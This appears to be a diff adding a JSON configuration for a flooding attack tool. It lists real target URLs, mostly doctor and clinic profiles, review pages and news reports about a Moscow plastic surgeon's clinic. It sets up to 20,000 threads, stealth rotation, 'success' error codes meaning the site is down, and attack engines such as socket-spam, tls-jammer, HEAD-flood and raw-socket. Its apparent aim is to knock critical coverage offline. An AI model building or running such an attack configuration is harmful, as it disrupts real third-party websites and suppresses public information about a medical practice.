@@ -1,0 +1,35 @@
+{
+  "battle_test_targets": [
+    "https://napopravku.ru/moskva/doctor-profile/mihajlov-andrej/",
+    "https://www.yahoo.com/news/prestigious-medspa-operated-illicitly-under-025211443.html",
+    "https://www.aol.com/prestigious-medspa-operated-illicitly-under-025211688.html",
+    "https://proverj.com/dr-shihirman/",
+    "https://napopravku.ru/moskva/doctor-profile/shihirman-jeduard-vadimovich/",
+    "https://napopravku.ru/moskva/clinics/klinika-plasticheskoj-hirurgii-dr-shihirman/",
+    "https://life.ru/p/1643820",
+    "https://pravda-klientov.ru/company/klinika-plasticheskoy-hirurgii-doktora-shihirmana",
+    "http://kazan.dscs.ru/?p=12531&ysclid=mbieyku3m5655555061"
+  ],
+  "success_threshold": 75,
+  "initial_threads": 500,
+  "max_threads": 20000,
+  "evolution_cycle_seconds": 60,
+  "stealth_rotation_seconds": 20,
+  "target_error_codes": ["404", "410", "503", "524"],
+  "blocked_codes": ["403", "429"],
+  "log_files": {
+    "stealth_session_trace": "stealth_sessions/stealth_session_trace_final.json",
+    "target_status": "reports/target_status_final.json",
+    "backend_log": "logs/backend.log"
+  },
+  "attack_engines": [
+    "auto-bypass",
+    "socket-spam", 
+    "http-spammer",
+    "tls-jammer",
+    "HEAD-flood",
+    "HumanScroll",
+    "raw-socket",
+    "fetch-retry"
+  ]
+}
